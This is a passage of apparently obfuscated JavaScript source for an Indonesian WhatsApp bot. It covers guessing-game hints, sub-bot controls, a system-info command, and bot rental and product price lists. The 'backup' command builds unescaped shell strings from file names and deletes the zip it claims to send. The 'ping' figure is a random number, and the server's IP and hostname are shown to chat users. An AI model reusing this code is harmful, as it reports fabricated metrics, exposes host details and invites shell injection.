              if (tekateki[_0x3f87c6.chat]) {
                _0x5eb3bb(_0x5c3eaf.jawaban);
                delete tekateki[_0x3f87c6.chat];
              }
            }, 0x1d4c0)];
          } catch (_0x5c0035) {
            console.log(_0x5c0035);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "bantuan":
        {
          try {
            if (_0x3f87c6.chat in tebakgambar) {
              let _0x1ef0fd = tebakgambar[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x1ef0fd.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakgame) {
              let _0x45de6b = tebakgame[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x45de6b.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakhero) {
              let _0x595252 = tebakhero[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x595252.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakff) {
              let _0x22b7fe = tebakff[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x22b7fe.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakkabupaten) {
              let _0x388f19 = tebakkabupaten[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x388f19.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```');
            }
            if (_0x3f87c6.chat in tebakjkt48) {
              let _0x5f016f = tebakjkt48[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x5f016f.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakhewan) {
              let _0x5680eb = tebakhewan[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x5680eb.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakml) {
              let _0x131129 = tebakml[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x131129.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```');
            }
            if (_0x3f87c6.chat in tebakchara) {
              let _0x5684de = tebakchara[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x5684de.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebaklogo) {
              let _0x327901 = tebaklogo[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x327901.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakaplikasi) {
              let _0x4273c4 = tebakaplikasi[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x4273c4.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```');
            }
            if (_0x3f87c6.chat in tebakkata) {
              let _0x337e78 = tebakkata[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x337e78.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in asahotak) {
              let _0xd64f3b = asahotak[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0xd64f3b.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in lengkapikalimat) {
              let _0x38bcb6 = lengkapikalimat[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x38bcb6.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakbendera) {
              let _0x1832b7 = tebakbendera[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x1832b7.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```');
            }
            if (_0x3f87c6.chat in tebakkalimat) {
              let _0x2647fa = tebakkalimat[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x2647fa.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in siapaaku) {
              let _0x5a01a9 = siapaaku[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x5a01a9.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebakkimia) {
              let _0x1301d3 = tebakkimia[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x1301d3.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebaklirik) {
              let _0x46aee7 = tebaklirik[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x46aee7.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tebaktebakan) {
              let _0x2b7aec = tebaktebakan[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x2b7aec.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in susunkata) {
              let _0x188bee = susunkata[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x188bee.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in caklontong) {
              let _0x4ad523 = caklontong[_0x3f87c6.chat][0x1];
              _0x3a091f("```" + _0x4ad523.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
            if (_0x3f87c6.chat in tekateki) {
              let _0x2987e6 = tekateki[_0x3f87c6.chat][0x1];
              _0x3a091f('```' + _0x2987e6.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + "```");
            }
          } catch (_0x5da1e2) {
            console.log(_0x5da1e2);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "nyerah":
        {
          try {
            if (_0x3f87c6.chat in siapaaku) {
              clearTimeout(siapaaku[_0x3f87c6.chat][0x3]);
              delete siapaaku[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakkalimat) {
              clearTimeout(tebakkalimat[_0x3f87c6.chat][0x3]);
              delete tebakkalimat[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakbendera) {
              clearTimeout(tebakbendera[_0x3f87c6.chat][0x3]);
              delete tebakbendera[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakkata) {
              clearTimeout(tebakkata[_0x3f87c6.chat][0x3]);
              delete tebakkata[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in asahotak) {
              clearTimeout(asahotak[_0x3f87c6.chat][0x3]);
              delete asahotak[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in lengkapikalimat) {
              clearTimeout(lengkapikalimat[_0x3f87c6.chat][0x3]);
              delete lengkapikalimat[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakgame) {
              clearTimeout(tebakgame[_0x3f87c6.chat][0x3]);
              delete tebakgame[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakhero) {
              clearTimeout(tebakhero[_0x3f87c6.chat][0x3]);
              delete tebakhero[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakff) {
              clearTimeout(tebakff[_0x3f87c6.chat][0x3]);
              delete tebakff[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakkabupaten) {
              clearTimeout(tebakkabupaten[_0x3f87c6.chat][0x3]);
              delete tebakkabupaten[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakjkt48) {
              clearTimeout(tebakjkt48[_0x3f87c6.chat][0x3]);
              delete tebakjkt48[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakhewan) {
              clearTimeout(tebakhewan[_0x3f87c6.chat][0x3]);
              delete tebakhewan[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakml) {
              clearTimeout(tebakml[_0x3f87c6.chat][0x3]);
              delete tebakml[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakchara) {
              clearTimeout(tebakchara[_0x3f87c6.chat][0x3]);
              delete tebakchara[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebaklogo) {
              clearTimeout(tebaklogo[_0x3f87c6.chat][0x3]);
              delete tebaklogo[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakaplikasi) {
              clearTimeout(tebakaplikasi[_0x3f87c6.chat][0x3]);
              delete tebakaplikasi[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakkimia) {
              clearTimeout(tebakkimia[_0x3f87c6.chat][0x3]);
              delete tebakkimia[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebaklirik) {
              clearTimeout(tebaklirik[_0x3f87c6.chat][0x3]);
              delete tebaklirik[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebaktebakan) {
              clearTimeout(tebaktebakan[_0x3f87c6.chat][0x3]);
              delete tebaktebakan[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in susunkata) {
              clearTimeout(susunkata[_0x3f87c6.chat][0x3]);
              delete susunkata[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in caklontong) {
              clearTimeout(caklontong[_0x3f87c6.chat][0x3]);
              delete caklontong[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tebakgambar) {
              clearTimeout(tebakgambar[_0x3f87c6.chat][0x3]);
              delete tebakgambar[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
            if (_0x3f87c6.chat in tekateki) {
              clearTimeout(tekateki[_0x3f87c6.chat][0x3]);
              delete tekateki[_0x3f87c6.chat];
              return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
                'text': "_Lemahhh_ 😏👎"
              }, {
                'quoted': _0x3f87c6
              });
            }
          } catch (_0x27c382) {
            console.log(_0x27c382);
            _0x3a091f("*Gagal memuat database dari server*. ☹️");
          }
          ;
        }
        break;
      case "backup":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x320b7b) {
            return;
          }
          let _0x506b41 = await randomBytes(Math.ceil(16)).toString("hex").slice(0x0, 0x20);
          const {
            execSync: _0x1be432
          } = require("child_process");
          const _0x5b5833 = (await _0x1be432('ls')).toString().split("\n").filter(_0x2bfc61 => _0x2bfc61 !== "node_modules" && _0x2bfc61 !== '' + sessionName && _0x2bfc61 !== 'package-lock.json' && _0x2bfc61 !== "yarn.lock" && _0x2bfc61 !== '');
          await _0x3a091f("Hasil backup akan dikirim lewat chat pribadi ya!");
          await _0x1be432("zip -r " + _0x506b41 + ".zip " + _0x5b5833.join(" "));
          await _0x1be432("rm -rf " + _0x506b41 + ".zip");
          console.log(_0x506b41 + ".zip telah dihapus dari file lokal.");
        }
        break;
      case "jadibot":
        {
          if (!_0x256404 && !_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x320b7b) {
            return;
          }
          await _0x3f87c6.react('✅');
          try {
            await jadibot(_0x59f5fa, _0x3f87c6, _0x3f87c6.sender);
          } catch (_0x1deb23) {
            console.log(_0x1deb23);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "stopjadibot":
        {
          if (!_0x256404 && !_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x320b7b) {
            return;
          }
          await _0x3f87c6.react('✅');
          try {
            await stopjadibot(_0x59f5fa, _0x3f87c6, _0x3f87c6.sender);
          } catch (_0x32d106) {
            console.log(_0x32d106);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "listjadibot":
        {
          if (!_0x256404 && !_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (_0x320b7b) {
            return;
          }
          await _0x3f87c6.react('✅');
          try {
            listjadibot(_0x59f5fa, _0x3f87c6);
          } catch (_0x5c19eb) {
            console.log(_0x5c19eb);
            _0x3a091f("Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.");
          }
          ;
        }
        break;
      case "ping":
      case 'speed':
      case "info":
      case 'infobot':
        {
          try {
            const {
              download: _0x9e382b,
              upload: _0x32e365
            } = await checkBandwidth();
            const _0x481f81 = os.cpus().map(_0x36afb2 => {
              _0x36afb2.total = Object.keys(_0x36afb2.times).reduce((_0x344e48, _0x2550cf) => _0x344e48 + _0x36afb2.times[_0x2550cf], 0x0);
              return _0x36afb2;
            });
            const _0x1e73f7 = _0x481f81.reduce((_0x5e8ae4, _0x349b02, _0x54bc33, {
              length: _0x3d4ee6
            }) => {
              _0x5e8ae4.total += _0x349b02.total;
              _0x5e8ae4.speed += _0x349b02.speed / _0x3d4ee6;
              _0x5e8ae4.times.user += _0x349b02.times.user;
              _0x5e8ae4.times.nice += _0x349b02.times.nice;
              _0x5e8ae4.times.sys += _0x349b02.times.sys;
              _0x5e8ae4.times.idle += _0x349b02.times.idle;
              _0x5e8ae4.times.irq += _0x349b02.times.irq;
              return _0x5e8ae4;
            }, {
              'speed': 0x0,
              'total': 0x0,
              'times': {
                'user': 0x0,
                'nice': 0x0,
                'sys': 0x0,
                'idle': 0x0,
                'irq': 0x0
              }
            });
            const _0xf19573 = await nou.os.oos();
            const _0x1bdf07 = await nou.mem.info();
            const _0x13469f = await nou.drive.info();
            const _0x246d11 = nou.os.uptime();
            let _0x142136 = "📡 *Bandwidth:*\n";
            _0x142136 += "- *Ping*: " + Math.random().toFixed(0x4) + " detik\n";
            _0x142136 += "- *Jaringan Masuk*: " + _0x9e382b + "\n";
            _0x142136 += "- *Jaringan Keluar*: " + _0x32e365 + "\n\n";
            _0x142136 += "🖥️ *Platform:*\n";
            _0x142136 += "- *OS*: " + _0xf19573 + "\n";
            _0x142136 += "- *IP Address*: " + nou.os.ip() + "\n";
            _0x142136 += "- *Tipe OS*: " + nou.os.type() + "\n";
            _0x142136 += "- *Hostname*: " + nou.os.hostname() + "\n";
            _0x142136 += "- *Arsitektur*: " + nou.os.arch() + "\n";
            _0x142136 += "- *Waktu Aktif*: " + Math.floor(_0x246d11 / 0xe10) + "h, " + Math.floor(_0x246d11 % 0xe10 / 0x3c) + "m\n\n";
            _0x142136 += "💾 *RAM:*\n";
            _0x142136 += "- *Total*: " + _0x1bdf07.totalMemMb + " MB\n";
            _0x142136 += "- *Digunakan*: " + _0x1bdf07.usedMemMb + " MB\n";
            _0x142136 += "- *Tersedia*: " + _0x1bdf07.freeMemMb + " MB\n\n";
            _0x142136 += "📂 *Penyimpanan:*\n";
            _0x142136 += "- *Total*: " + _0x13469f.totalGb + " GB\n";
            _0x142136 += "- *Digunakan*: " + _0x13469f.usedGb + " GB (" + _0x13469f.usedPercentage + "%)\n";
            _0x142136 += "- *Tersedia*: " + _0x13469f.freeGb + " GB (" + _0x13469f.freePercentage + "%)\n\n";
            _0x142136 += "⚙️ *CPU (" + _0x481f81.length + " Core)*\n";
            _0x142136 += "- *Model*: " + _0x481f81[0x0].model.trim() + "\n";
            _0x142136 += "- *Kecepatan*: " + _0x1e73f7.speed.toFixed(0x2) + " MHz\n";
            _0x142136 += '' + Object.keys(_0x1e73f7.times).map(_0x3ce3d9 => "- *" + _0x3ce3d9 + "*: " + (0x64 * _0x1e73f7.times[_0x3ce3d9] / _0x1e73f7.total).toFixed(0x2) + '%').join("\n");
            await _0x3f87c6.reply({
              'image': imageBuffer,
              'caption': _0x142136
            });
          } catch (_0x86a1b3) {
            console.error(_0x86a1b3);
            await _0x3a091f("Maaf kak, ada error waktu ambil informasi perangkat. 🙏");
          }
        }
        ;
        break;
      case 'sc':
      case "script":
        {
          let _0x59a1d7 = "Nyari " + _0x4ac520 + "? Buy di wa.me/" + ownerNumber + " 😋👍";
          _0x3a091f(_0x59a1d7);
        }
        ;
        break;
      case "listproduk":
        {
          const _0x4bbf1b = [{
            'name': "Panel Pterodactyl",
            'price': "Rp 50.000",
            'desc': "Panel manajemen game server berbasis Pterodactyl."
          }, {
            'name': "Script Bot WhatsApp",
            'price': "Rp 75.000",
            'desc': "Bot WhatsApp berbasis Node.js dengan berbagai fitur menarik."
          }, {
            'name': "Script Bot Telegram",
            'price': "Rp 65.000",
            'desc': "Bot Telegram custom dengan fitur auto-reply dan admin panel."
          }, {
            'name': "Hosting Panel Pterodactyl",
            'price': "Rp 100.000",
            'desc': "Hosting siap pakai untuk panel Pterodactyl dengan support full setup."
          }, {
            'name': "Script YouTube Downloader",
            'price': "Rp 50.000",
            'desc': "Scraper YouTube berbasis Node.js untuk mengunduh video/audio dengan cepat."
          }, {
            'name': "API Gateway",
            'price': "Rp 80.000",
            'desc': "API Gateway untuk integrasi layanan host-to-host, cocok untuk bisnis digital."
          }, {
            'name': "Jasa Setup VPS",
            'price': "Rp 150.000",
            'desc': "Setup VPS untuk kebutuhan hosting, bot, dan lainnya."
          }, {
            'name': "Bot Auto Responder",
            'price': "Rp 70.000",
            'desc': "Bot otomatis untuk merespon chat pelanggan dengan cepat."
          }];
          let _0x2df12e = "*📌 Daftar Produk Tersedia:*\n\n";
          _0x4bbf1b.forEach((_0x4c7e86, _0x31bc8e) => {
            _0x2df12e += '*' + (_0x31bc8e + 0x1) + ". " + _0x4c7e86.name + "*\n💰 Harga: " + _0x4c7e86.price + "\n📄 Deskripsi: " + _0x4c7e86.desc + "\n\n";
          });
          _0x3f87c6.reply(_0x2df12e);
        }
        ;
        break;
      case "sewabot":
      case 'daftarprem':
      case "buyprem":
      case "sewa":
        {
          let _0x5e8603 = [{
            'name': "cta_url",
            'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"display_text\": \"Chat Owner 💫\",\n\t\t\t\t\t\t\t\"url\": \"https://api.whatsapp.com/send/?phone=" + ownerNumber + "\",\n\t\t\t\t\t\t\t\"merchant_url\": \"https://api.whatsapp.com/send/?phone=" + ownerNumber + "\"\n\t\t\t\t\t\t}"
          }, {
            'name': "cta_url",
            'buttonParamsJson': "{\n\t\t\t\t\t\t\t\"display_text\": \"Newsletter 📣\",\n\t\t\t\t\t\t\t\"url\": \"" + wagc + "\",\n\t\t\t\t\t\t\t\"merchant_url\": \"" + wagc + "\"\n\t\t\t\t\t\t}"
          }];
          let _0x35bff3 = "*🌟 SEWA BOT & VVIP REGISTRATION 🌟*\n\n";
          _0x35bff3 += "📣 *Sewa Bot untuk Grup:*\n";
          _0x35bff3 += "🕐 *1 Minggu:* Rp 7.000\n";
          _0x35bff3 += "📅 *1 Bulan:* Rp 12.000\n";
          _0x35bff3 += "🔥 *Permanent:* Rp 25.000\n\n";
          _0x35bff3 += "💎 *VVIP Membership:*\n";
          _0x35bff3 += "🕐 *1 Minggu:* Rp 7.000\n";
          _0x35bff3 += "📅 *1 Bulan:* Rp 10.000\n";
          _0x35bff3 += "🔥 *Permanent:* Rp 20.000\n\n";
          _0x35bff3 += "⚡ _Dapatkan layanan terbaik dan akses eksklusif!_";
          await _0x59f5fa.sendButtonImage(_0x3f87c6.chat, {
            'url': imageUrl
          }, _0x5e8603, _0x35bff3, footer, _0x3f87c6);
        }
        break;
      case "listsewa":
        {
          let _0x124765 = "*📜 LIST SEWA GROUP 📜*\n\n";
          _0x124765 += "📌 *Total Grup:* " + sewa.length + "\n\n";
          for (let _0x550a78 of sewa) {
            let _0x41673f = await _0x59f5fa.groupMetadata(_0x550a78.id);
            _0x124765 += "📍 *Nama:* " + _0x41673f.subject + "\n";
            _0x124765 += "🔗 *ID:* " + _0x550a78.id + "\n";
            if (_0x550a78.expired === "PERMANENT") {
              _0x124765 += "⏳ *Expire:* PERMANENT\n\n";
            } else {
              let _0x6ff242 = ms(_0x550a78.expired - Date.now());
              _0x124765 += "⏳ *Expire:* " + _0x6ff242.days + "d, " + _0x6ff242.hours + "h, " + _0x6ff242.minutes + "m, " + _0x6ff242.seconds + "s.\n\n";
            }
          }
          _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'text': _0x124765
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "checksewa":
      case "ceksewa":
        {
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f(mess.group);
          }
          if (!_0x28438b) {
            return _0x3a091f("⚠️ Bot tidak sedang disewa di grup ini!");
          }
          let _0x3fca1d = ms(getSewaExpired(_0x3f87c6.chat) - Date.now());
          let _0x286798 = "*📌 INFO SEWA BOT 📌*\n\n";
          _0x286798 += "📍 *Grup:* " + _0x3f87c6.chat.split('@')[0x0] + "\n";
          _0x286798 += "⏳ *Expired:* " + _0x3fca1d.days + " Hari\n";
          _0x286798 += "📆 *Countdown:*\n";
          _0x286798 += "⏰ " + _0x3fca1d.days + " Hari, " + _0x3fca1d.hours + " Jam, " + _0x3fca1d.minutes + " Menit\n\n";
          _0x286798 += "✨ *Benefit:* \n";
          _0x286798 += "- Fitur: 1300++\n";
          _0x286798 += "- Manajemen: Yes\n";
          _0x286798 += "- Request: 1/5s\n";
          _0x286798 += "- VIP Access: No\n";
          _0x286798 += "- Grup Priority: Yes\n";
          _0x286798 += "- Proteksi: Yes\n";
          const _0x36588f = {
            'text': _0x286798,
            'contextInfo': {
              'mentionedJid': parseMention(_0x286798),
              'externalAdReply': {
                'title': "📣 GROUP SEWA 💫",
                'previewType': "PHOTO",
                'thumbnailUrl': imageUrl,
                'sourceUrl': wagc
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x3f87c6.chat, _0x36588f, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "addsewa":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458[0x0]) {
            return _0x3a091f("⚠️ *Masukkan link dan durasi sewa!*\n\n📌 Contoh:\n" + (_0x4773c6 + _0x4ac520) + " linkgrup 30d\n");
          }
          if (!isUrl(_0x143458[0x0])) {
            return _0x3a091f(mess.error.Iv);
          }
          if (!_0x143458[0x1]) {
            return _0x3a091f("⚠️ *Masukkan durasi sewa!*\n\n📌 Contoh:\n" + (_0x4773c6 + _0x4ac520) + " linkgrup 30d\n");
          }
          let _0x600ba3 = _0x143458[0x0].split('https://chat.whatsapp.com/')[0x1];
          let _0x2d4841 = await _0x59f5fa.groupGetInviteInfo(_0x600ba3);
          let _0x19512b;
          let _0x4eb04f;
          let _0x23bf1b = (await _0x59f5fa.groupFetchAllParticipating())[_0x2d4841.id];
          if (!_0x23bf1b) {
            _0x19512b = await _0x59f5fa.groupAcceptInvite(_0x600ba3);
            _0x4eb04f = _0x143458[0x1];
          } else {
            _0x19512b = _0x2d4841.id;
            _0x4eb04f = _0x143458[0x1];
          }
          if (!_0x19512b) {
            return _0x3f87c6.reply("⚠️ Link tidak valid atau grup private!");
          }
          if (checkSewaGroup(_0x19512b)) {
            return _0x3a091f("⚠️ Bot sudah disewa oleh grup tersebut!");
          }
          addSewaGroup(_0x19512b, _0x4eb04f);
          _0x3f87c6.reply("✅ *Sewa bot berhasil ditambahkan!*");
          await sleep(0xbb8);
          let _0x104a5c = ms(getSewaExpired(_0x19512b) - Date.now());
          let _0x6d33e9 = "*📌 INFO SEWA BOT 📌*\n\n";
          _0x6d33e9 += "📍 *Grup:* " + _0x19512b.split('@')[0x0] + "\n";
          _0x6d33e9 += "⏳ *Expired:* " + _0x4eb04f + "\n";
          _0x6d33e9 += "📆 *Countdown:*\n";
          _0x6d33e9 += "⏰ " + _0x104a5c.days + "d, " + _0x104a5c.hours + "h, " + _0x104a5c.minutes + "m, " + _0x104a5c.seconds + "s.\n\n";
          _0x6d33e9 += "✨ *Benefit:* \n";
          _0x6d33e9 += "- Fitur: 1300++\n";
          _0x6d33e9 += "- Manajemen: Yes\n";
          _0x6d33e9 += "- Request: 1/5s\n";
          _0x6d33e9 += "- VIP Access: No\n";
          _0x6d33e9 += "- Grup Priority: Yes\n";
          _0x6d33e9 += "- Proteksi: Yes\n";
          const _0x3aa6b0 = {
            'text': _0x6d33e9,
            'contextInfo': {
              'mentionedJid': parseMention(_0x6d33e9),
              'externalAdReply': {
                'title': "📣 GROUP SEWA 💫",
                'previewType': "PHOTO",
                'thumbnailUrl': imageUrl,
                'sourceUrl': wagc
              }
            }
          };
          return _0x59f5fa.sendMessage(_0x19512b, _0x3aa6b0, {
            'quoted': _0x3f87c6
          });
        }
        break;
      case "delsewa":
        {
          let _0x28614c = JSON.parse(fs.readFileSync("./src/data/role/sewa.json"));
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x3f87c6.isGroup) {
            return _0x3a091f("⚠️ Perintah ini hanya bisa dilakukan di grup yang menyewa bot!");
          }
          if (!_0x28438b) {
            return _0x3a091f("⚠️ Bot tidak disewa di grup ini!");
          }
          _0x28614c.splice(getSewaPosition(_0x3f87c6.chat), 0x1);
          fs.writeFileSync("./src/data/role/sewa.json", JSON.stringify(_0x28614c, null, 0x2));
          _0x3f87c6.reply("✅ *Grup berhasil dihapus dari daftar sewa!*");
        }
        break;
      case "addbadword":
      case "addbd":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x85e063) {
            return _0x3a091f(mess.admin);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("📝 *Kirim perintah*: " + _0x4773c6 + "addbadword [kata kasar]\n*Kirim perintah*: " + _0x4773c6 + "addbadword asshole");
          }
          bad.push(q);
          fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
          _0x3a091f("✅ *Kata kasar berhasil ditambahkan ke daftar!*");
        }
        break;
      case "delbadword":
      case "deldb":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x85e063) {
            return _0x3a091f(mess.admin);
          }
          if (_0x143458.length < 0x1) {
            return _0x3a091f("📝 *Kirim perintah*: " + _0x4773c6 + "delbadword [kata kasar]\n*Kirim perintah*: " + _0x4773c6 + "delbadword asshole");
          }
          bad.splice(q);
          fs.writeFileSync('./src/data/function/badword.json', JSON.stringify(bad));
          _0x3a091f("✅ *Kata kasar berhasil dihapus dari daftar!*");
        }
        break;
      case "resetuser":
      case "resetdbuser":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          _0x3a091f("Berhasil menghapus semua data pengguna dari database.");
          db.data.users = [];
        }
        break;
      case "resethit":
      case 'resettotalhit':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
